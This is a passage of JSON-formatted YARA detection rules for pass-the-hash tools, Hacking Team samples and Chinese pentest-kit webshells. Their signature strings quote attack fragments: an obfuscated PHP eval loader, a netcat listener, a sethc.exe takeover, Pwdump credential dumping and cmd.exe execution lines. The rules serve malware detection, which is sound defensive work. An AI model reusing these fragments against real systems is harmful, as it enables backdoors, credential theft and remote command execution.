= \"Error in cmdline!. Bye!.\" fullword ascii\n      $s5 = \"Error: Cannot open LSASS.EXE!.\" fullword ascii\n      $s6 = \"nthash is too long!.\" fullword ascii\n      $s7 = \"LSASS HANDLE: %x\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 240KB and 2 of them\n}","date":"2015-07-10 10:18:11","description":"Semiautomatic generated rule - file iam-alt.exe","minimum_yara":"1.7","name":"iam_alt_iam_alt_RID2D1E","reference":"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit","required_modules":[],"rule_hash":"75e468f01861240ca46c11a73e155791","score":80,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule genhash_genhash_RID2D2C : APT DEMO EXE FILE {\n   meta:\n      description = \"Semiautomatic generated rule - file genhash.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit\"\n      date = \"2015-07-10 10:20:31\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"genhash.exe <password>\" fullword ascii\n      $s3 = \"Password: %s\" fullword ascii\n      $s4 = \"%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X\" fullword ascii\n      $s5 = \"This tool generates LM and NT hashes.\" fullword ascii\n      $s6 = \"(hashes format: LM Hash:NT hash)\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them\n}","date":"2015-07-10 10:20:31","description":"Semiautomatic generated rule - file genhash.exe","minimum_yara":"1.7","name":"genhash_genhash_RID2D2C","reference":"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit","required_modules":[],"rule_hash":"2ea2658d93c0360e2e529a779865c8ba","score":80,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule iam_iamdll_RID2B1A : APT DEMO EXE FILE {\n   meta:\n      description = \"Semiautomatic generated rule - file iamdll.dll\"\n      author = \"Florian Roth\"\n      reference = \"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit\"\n      date = \"2015-07-10 08:52:11\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"LSASRV.DLL\" fullword ascii\n      $s1 = \"iamdll.dll\" fullword ascii\n      $s2 = \"ChangeCreds\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 115KB and all of them\n}","date":"2015-07-10 08:52:11","description":"Semiautomatic generated rule - file iamdll.dll","minimum_yara":"1.7","name":"iam_iamdll_RID2B1A","reference":"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit","required_modules":[],"rule_hash":"9f48a4d122248218866830a3cd967f85","score":80,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule iam_iam_RID29DE : APT DEMO EXE FILE {\n   meta:\n      description = \"Semiautomatic generated rule - file iam.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit\"\n      date = \"2015-07-10 01:55:01\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<cmd>. Create a new logon session and run a command with the specified credentials (e.g.: -r cmd.exe)\" fullword ascii\n      $s2 = \"iam.exe -h administrator:mydomain:\" ascii\n      $s3 = \"An error was encountered when trying to change the current logon credentials!.\" fullword ascii\n      $s4 = \"optional parameter. If iam.exe crashes or doesn't work when run in your system, use this parameter.\" fullword ascii\n      $s5 = \"IAM.EXE will try to locate some memory locations instead of using hard-coded values.\" fullword ascii\n      $s6 = \"Error in cmdline!. Bye!.\" fullword ascii\n      $s7 = \"Checking LSASRV.DLL....\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}","date":"2015-07-10 01:55:01","description":"Semiautomatic generated rule - file iam.exe","minimum_yara":"1.7","name":"iam_iam_RID29DE","reference":"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit","required_modules":[],"rule_hash":"2dfbf2fbfd432b39293b298c5682eedc","score":80,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule whosthere_alt_pth_RID2E35 : APT DEMO EXE FILE {\n   meta:\n      description = \"Semiautomatic generated rule - file pth.dll\"\n      author = \"Florian Roth\"\n      reference = \"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit\"\n      date = \"2015-07-10 11:04:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"c:\\\\debug.txt\" fullword ascii\n      $s1 = \"pth.dll\" fullword ascii\n      $s2 = \"\\\"Primary\\\" string found at %.8Xh\" fullword ascii\n      $s3 = \"\\\"Primary\\\" string not found!\" fullword ascii\n      $s4 = \"segment 1 found at %.8Xh\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 240KB and 4 of them\n}","date":"2015-07-10 11:04:41","description":"Semiautomatic generated rule - file pth.dll","minimum_yara":"1.7","name":"whosthere_alt_pth_RID2E35","reference":"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit","required_modules":[],"rule_hash":"6320ce0a3be29b44577b9ac9238fddc5","score":80,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule whosthere_RID2AEA : APT DEMO EXE FILE {\n   meta:\n      description = \"Semiautomatic generated rule - file whosthere_RID2AEA.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit\"\n      date = \"2015-07-10 09:21:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"by Hernan Ochoa (hochoa@coresecurity.com, hernan@gmail.com) - (c) 2007-2008 Core Security Technologies\" fullword ascii\n      $s2 = \"whosthere_RID2AEA enters an infinite loop and searches for new logon sessions every 2 seconds. Only new sessions are shown if found.\" fullword ascii\n      $s3 = \"specify addresses to use. Format: ADDCREDENTIAL_ADDR:ENCRYPTMEMORY_ADDR:FEEDBACK_ADDR:DESKEY_ADDR:LOGONSESSIONLIST_ADDR:LOGONSES\" ascii\n      $s4 = \"Could not enable debug privileges. You must run this tool with an account with administrator privileges.\" fullword ascii\n      $s5 = \"-B is now used by default. Trying to find correct addresses..\" fullword ascii\n      $s6 = \"Cannot get LSASS.EXE PID!\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 320KB and 2 of them\n}","date":"2015-07-10 09:21:41","description":"Semiautomatic generated rule - file whosthere.exe","minimum_yara":"1.7","name":"whosthere_RID2AEA","reference":"http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit","required_modules":[],"rule_hash":"63b5523950daee78ff4c5794618e36a1","score":80,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule Hackingteam_Elevator_DLL_RID3049 : APT DEMO EXE FILE {\n   meta:\n      description = \"Hacking Team Disclosure Sample - file elevator.dll\"\n      author = \"Florian Roth\"\n      reference = \"http://t.co/EG0qtVcKLh\"\n      date = \"2015-07-07 12:33:21\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\sysnative\\\\CI.dll\" fullword ascii\n      $s2 = \"setx TOR_CONTROL_PASSWORD\" fullword ascii\n      $s3 = \"mitmproxy0\" fullword ascii\n      $s4 = \"\\\\insert_cert.exe\" fullword ascii\n      $s5 = \"elevator.dll\" fullword ascii\n      $s6 = \"CRTDLL.DLL\" fullword ascii\n      $s7 = \"fail adding cert\" fullword ascii\n      $s8 = \"DownloadingFile\" fullword ascii\n      $s9 = \"fail adding cert: %s\" fullword ascii\n      $s10 = \"InternetOpenA fail\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 6 of them\n}","date":"2015-07-07 12:33:21","description":"Hacking Team Disclosure Sample - file elevator.dll","minimum_yara":"1.7","name":"Hackingteam_Elevator_DLL_RID3049","reference":"http://t.co/EG0qtVcKLh","required_modules":[],"rule_hash":"bd9c1be1e921b6957139fc26ec5733c9","score":80,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule HackingTeam_Elevator_EXE_RID302F : APT DEMO EXE FILE {\n   meta:\n      description = \"Hacking Team Disclosure Sample - file elevator.exe\"\n      author = \"Florian Roth\"\n      reference = \"Hacking Team Disclosure elevator.c\"\n      date = \"2015-07-07 12:29:01\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"CRTDLL.DLL\" fullword ascii\n      $x2 = \"\\\\sysnative\\\\CI.dll\" fullword ascii\n      $x3 = \"\\\\SystemRoot\\\\system32\\\\CI.dll\" fullword ascii\n      $x4 = \"C:\\\\\\\\Windows\\\\\\\\Sysnative\\\\\\\\ntoskrnl.exe\" fullword ascii\n      $s1 = \"[*] traversing processes\" fullword ascii\n      $s2 = \"_getkprocess\" fullword ascii\n      $s3 = \"[*] LoaderConfig %p\" fullword ascii\n      $s4 = \"loader.obj\" fullword ascii\n      $s5 = \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3\" ascii\n      $s6 = \"[*] token restore\" fullword ascii\n      $s7 = \"elevator.obj\" fullword ascii\n      $s8 = \"_getexport\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and all of ( $x* ) and 3 of ( $s* )\n}","date":"2015-07-07 12:29:01","description":"Hacking Team Disclosure Sample - file elevator.exe","minimum_yara":"1.7","name":"HackingTeam_Elevator_EXE_RID302F","reference":"Hacking Team Disclosure elevator.c","required_modules":[],"rule_hash":"56c349f7bfa6d5269c87fff3892ce72b","score":80,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_PHP_BlackSky_RID32B7 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file php6.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 14:17:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"eval(gzinflate(base64_decode('\" ascii\n      $s1 = \"B1ac7Sky-->\" fullword ascii\n   condition: \n      filesize < 641KB and all of them\n}","date":"2015-06-23 14:17:01","description":"Webshell from CN Honker Pentest Toolset - file php6.txt","minimum_yara":"1.7","name":"CN_Honker_Webshell_PHP_BlackSky_RID32B7","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"69aad7f19dd615165972e98dba9cabd3","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_PHP_php2_RID311D : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file php2.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:08:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$OOO0O0O00=__FILE__;$OOO000000=urldecode('\" ascii\n      $s2 = \"<?php // Black\" fullword ascii\n   condition: \n      filesize < 12KB and all of them\n}","date":"2015-06-23 13:08:41","description":"Webshell from CN Honker Pentest Toolset - file php2.txt","minimum_yara":"1.7","name":"CN_Honker_Webshell_PHP_php2_RID311D","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"c6c863c37de115d62be86a1680b7a25e","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_PHP_php4_RID311F : DEMO FILE T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file php4.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:09:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"nc -l -vv -p port(\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x4850 and filesize < 1KB and all of them\n}","date":"2015-06-23 13:09:01","description":"Webshell from CN Honker Pentest Toolset - file php4.txt","minimum_yara":"1.7","name":"CN_Honker_Webshell_PHP_php4_RID311F","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"b827db8fee745099ecebef6a02a01805","score":70,"tags":["T1100","DEMO","WEBSHELL","FILE"]},{"author":"Florian Roth","content":"rule CN_Honker_sig_3389_3389_RID2E76 : DEMO SUSP {\n   meta:\n      description = \"Script from disclosed CN Honker Pentest Toolset - file 3389.vbs\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:15:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"success = obj.run(\\\"cmd /c takeown /f %SystemRoot%\\\\system32\\\\sethc.exe&echo y| \" ascii\n   condition: \n      filesize < 10KB and all of them\n}","date":"2015-06-23 11:15:31","description":"Script from disclosed CN Honker Pentest Toolset - file 3389.vbs","minimum_yara":"1.7","name":"CN_Honker_sig_3389_3389_RID2E76","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"a3e2f198db19c42b44f22a9647f354d2","score":70,"tags":["SUSP","DEMO"]},{"author":"Florian Roth","content":"rule CN_Honker_sig_3389_3389_2_RID2F07 : DEMO SUSP {\n   meta:\n      description = \"Script from disclosed CN Honker Pentest Toolset - file 3389.bat\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:39:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"@del c:\\\\termsrvhack.dll\" fullword ascii\n      $s2 = \"@del c:\\\\3389.txt\" fullword ascii\n   condition: \n      filesize < 3KB and all of them\n}","date":"2015-06-23 11:39:41","description":"Script from disclosed CN Honker Pentest Toolset - file 3389.bat","minimum_yara":"1.7","name":"CN_Honker_sig_3389_3389_2_RID2F07","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"6644e1a3673082c51786e89cd0ad75f2","score":70,"tags":["SUSP","DEMO"]},{"author":"Florian Roth","content":"rule CN_Honker_Pwdump7_Pwdump7_RID308E : DEMO SUSP T1003 {\n   meta:\n      description = \"Script from disclosed CN Honker Pentest Toolset - file Pwdump7.bat\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:44:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SUSP, T1003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Pwdump7.exe >pass.txt\" fullword ascii\n   condition: \n      filesize < 1KB and all of them\n}","date":"2015-06-23 12:44:51","description":"Script from disclosed CN Honker Pentest Toolset - file Pwdump7.bat","minimum_yara":"1.7","name":"CN_Honker_Pwdump7_Pwdump7_RID308E","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"6d6cfcc099fba5c1021a862f05e0dbbf","score":70,"tags":["SUSP","DEMO","T1003"]},{"author":"Florian Roth","content":"rule CN_Honker_syconfig_RID2E29 : DEMO FILE SUSP {\n   meta:\n      description = \"Script from disclosed CN Honker Pentest Toolset - file syconfig.dll\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 11:02:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s9 = \"Hashq.CrackHost+FormUnit\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x0100 and filesize < 18KB and all of them\n}","date":"2015-06-23 11:02:41","description":"Script from disclosed CN Honker Pentest Toolset - file syconfig.dll","minimum_yara":"1.7","name":"CN_Honker_syconfig_RID2E29","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"4ffcd67bbc0a56ff358c2ff7be7f3157","score":70,"tags":["SUSP","DEMO","FILE"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_PHP_php5_RID3120 : DEMO FILE T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file php5.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:09:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user\" ascii\n      $s20 = \"echo sr(35,in('hidden','dir',0,$dir).in('hidden','cmd',0,'mysql_dump').\\\"<b>\\\".$\" ascii\n   condition: \n      uint16 ( 0 ) == 0x3f3c and filesize < 300KB and all of them\n}","date":"2015-06-23 13:09:11","description":"Webshell from CN Honker Pentest Toolset - file php5.txt","minimum_yara":"1.7","name":"CN_Honker_Webshell_PHP_php5_RID3120","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"df6383045b488026ef60e5ba88e2d64c","score":70,"tags":["T1100","DEMO","WEBSHELL","FILE"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_test3693_RID30F1 : DEMO FILE T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file test3693.war\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:01:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Process p=Runtime.getRuntime().exec(\\\"cmd /c \\\"+strCmd);\" fullword ascii\n      $s2 = \"http://www.topronet.com </font>\\\",\\\" <font color=red> Thanks for your support - \" ascii\n   condition: \n      uint16 ( 0 ) == 0x4b50 and filesize < 50KB and all of them\n}","date":"2015-06-23 13:01:21","description":"Webshell from CN Honker Pentest Toolset - file test3693.war","minimum_yara":"1.7","name":"CN_Honker_Webshell_test3693_RID30F1","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"781125768081bd83b5a75af14f6801d7","score":70,"tags":["T1100","DEMO","WEBSHELL","FILE"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_mycode12_RID3140 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file mycode12.cfm\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:14:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<cfexecute name=\\\"cmd.exe\\\"\" fullword ascii\n      $s2 = \"<cfoutput>#cmd#</cfoutput>\" fullword ascii\n   condition: \n      filesize < 4KB and all of them\n}","date":"2015-06-23 13:14:31","description":"Webshell from CN Honker Pentest Toolset - file mycode12.cfm","minimum_yara":"1.7","name":"CN_Honker_Webshell_mycode12_RID3140","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"ac5bd6a53982801ac062db53eef6dd5d","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_offlibrary_RID328C : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file offlibrary.php\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 14:09:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"';$i=$g->query(\\\"SELECT SUBSTRING_INDEX(CURRENT_USER, '@', 1) AS User, SUBSTRING\" ascii\n      $s12 = \"if(jushRoot){var script=document.createElement('script');script.src=jushRoot+'ju\" ascii\n   condition: \n      filesize < 1005KB and all of them\n}","date":"2015-06-23 14:09:51","description":"Webshell from CN Honker Pentest Toolset - file offlibrary.php","minimum_yara":"1.7","name":"CN_Honker_Webshell_offlibrary_RID328C","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"2f99903844128d4f5d4bcbac0b5cd096","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_cfm_xl_RID30D5 : DEMO FILE T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file xl.cfm\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:56:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<input name=\\\"DESTINATION\\\" value=\\\"\" ascii\n      $s1 = \"<CFFILE ACTION=\\\"Write\\\" FILE=\\\"#Form.path#\\\" OUTPUT=\\\"#Form.cmd#\\\">\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x433c and filesize < 13KB and all of them\n}","date":"2015-06-23 12:56:41","description":"Webshell from CN Honker Pentest Toolset - file xl.cfm","minimum_yara":"1.7","name":"CN_Honker_Webshell_cfm_xl_RID30D5","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"a28723579c031ad6c6af224ab9fe2f53","score":70,"tags":["T1100","DEMO","WEBSHELL","FILE"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_PHP_linux_RID31D3 : DEMO FILE T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file linux.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:39:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<form name=form1 action=exploit.php method=post>\" fullword ascii\n      $s1 = \"<title>Changing CHMOD Permissions Exploit \" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x696c and filesize < 6KB and all of them\n}","date":"2015-06-23 13:39:01","description":"Webshell from CN Honker Pentest Toolset - file linux.txt","minimum_yara":"1.7","name":"CN_Honker_Webshell_PHP_linux_RID31D3","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"f861b2c73ca4a08ded7705140b5c8128","score":70,"tags":["T1100","DEMO","WEBSHELL","FILE"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_Interception3389_get_RID35C6 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file get.asp\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 16:27:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"userip = Request.ServerVariables(\\\"HTTP_X_FORWARDED_FOR\\\")\" fullword ascii\n      $s1 = \"file.writeline  szTime + \\\" HostName:\\\" + szhostname + \\\" IP:\\\" + userip+\\\":\\\"+n\" ascii\n      $s3 = \"set file=fs.OpenTextFile(server.MapPath(\\\"WinlogonHack.txt\\\"),8,True)\" fullword ascii\n   condition: \n      filesize < 3KB and all of them\n}","date":"2015-06-23 16:27:31","description":"Webshell from CN Honker Pentest Toolset - file get.asp","minimum_yara":"1.7","name":"CN_Honker_Webshell_Interception3389_get_RID35C6","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"cf73446922e0cb36bbc296bb3506bc00","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_nc_1_RID2FBD : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file 1.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 12:10:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Mozilla/4.0 \" ascii\n      $s2 = \"<%if session(\\\"pw\\\")<>\\\"go\\\" then %>\" fullword ascii\n   condition: \n      filesize < 11KB and all of them\n}","date":"2015-06-23 12:10:01","description":"Webshell from CN Honker Pentest Toolset - file 1.txt","minimum_yara":"1.7","name":"CN_Honker_Webshell_nc_1_RID2FBD","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"b4f52fb3a5b15a693d6a94ebbdefd1f1","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_ASP_asp3_RID3116 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file asp3.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:07:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"if shellpath=\\\"\\\" then shellpath = \\\"cmd.exe\\\"\" fullword ascii\n      $s2 = \"c.open \\\"GET\\\", \\\"http://127.0.0.1:\\\" & port & \\\"/M_Schumacher/upadmin/s3\\\", Tru\" ascii\n   condition: \n      filesize < 444KB and all of them\n}","date":"2015-06-23 13:07:31","description":"Webshell from CN Honker Pentest Toolset - file asp3.txt","minimum_yara":"1.7","name":"CN_Honker_Webshell_ASP_asp3_RID3116","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"08fb4030c1c50809ce721bae37622c3a","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_ASPX_sniff_RID320D : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file sniff.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:48:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"IPHostEntry HosyEntry = Dns.GetHostEntry((Dns.GetHostName()));\" fullword ascii\n      $s2 = \"if (!logIt && my_s_smtp && (dport == 25 || sport == 25))\" fullword 